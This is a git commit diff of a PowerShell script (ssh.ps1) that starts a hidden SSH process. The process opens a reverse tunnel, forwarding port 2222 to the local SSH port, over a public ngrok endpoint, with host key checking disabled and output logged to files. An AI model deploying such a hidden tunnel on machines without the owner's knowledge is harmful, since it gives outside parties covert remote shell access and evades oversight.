cbc6506c6e79aa49635320b8f29429c88a4fb259
usermants <sanchezguy@proton.me>
2025-09-08 18:24:14 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -2,28 +2,27 @@
 $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
 # Caminho da chave privada
-$keyPath = "C:\Users\Teste\.ssh\ssh_key"
+$keyPath = "C:\Users\Testes\.ssh\ssh_key" 
 
-# Arquivos de log separados
-$stdoutLog = "C:\Users\Teste\.ssh\ssh_stdout.log"
-$stderrLog = "C:\Users\Teste\.ssh\ssh_stderr.log"
+# Caminhos dos arquivos de log
+$stdoutLog = "C:\Users\Testes\ssh_stdout_log.txt"
+$stderrLog = "C:\Users\Testes\ssh_stderr_log.txt"
 
 # Argumentos do SSH
-$sshArgs = @(
+$arguments = @(
     "-i", "$keyPath",
     "-o", "StrictHostKeyChecking=no",
     "-o", "ServerAliveInterval=60",
     "-o", "ServerAliveCountMax=3",
     "-o", "ExitOnForwardFailure=yes",
     "-R", "2222:localhost:22",
-    "logosofico@0.tcp.sa.ngrok.io",
+    "logosofico@0.tcp.sa.ngrok.io", 
     "-p", "17096",
-    "-N"
+    "-N",
+    "-vvv"
 )
 
-# Executa SSH em segundo plano com logs separados
-Start-Process -FilePath $sshPath `
-              -ArgumentList $sshArgs `
-              -RedirectStandardOutput $stdoutLog `
-              -RedirectStandardError $stderrLog `
-              -WindowStyle Hidden
+# Executa SSH invisível e redireciona saída e erros para arquivos separados
+Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden `
+    -RedirectStandardOutput $stdoutLog `
+    -RedirectStandardError $stderrLog
